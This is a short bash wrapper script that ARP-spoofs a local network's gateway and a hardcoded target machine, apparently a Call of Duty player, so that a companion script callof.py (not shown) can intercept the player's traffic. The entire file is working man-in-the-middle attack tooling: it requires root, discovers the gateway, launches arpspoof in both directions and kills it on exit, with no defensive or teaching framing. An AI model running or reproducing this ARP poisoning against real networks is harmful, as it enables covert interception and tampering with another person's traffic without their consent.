#!/bin/bash
#
# Wrapper script for callof.py script
# arpspoof gateway to intercept network flow between call of duty player and gateway
#


#########################
# Variables
#########################

ETH=eth0
PLAYER=192.168.0.1

#########################
# Functions
#########################

function clean {
	pkill arpspoof
}

#########################
# Main
#########################

trap clean SIGINT

# check that we are root
if [ $(id -u) -ne 0 ]
then
	echo "rerun as root"
	exit 1
fi

gateway=$(ip route | grep -o -P '(?<=default via )[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')

# kill all arpspoof processes
clean

# spoof gateway and player
arpspoof -i $ETH -t $PLAYER $gateway &> /dev/null &
arpspoof -i $ETH -t $gateway $PLAYER &> /dev/null &

# main script
./callof.py

# kill all arpspoof processes
clean
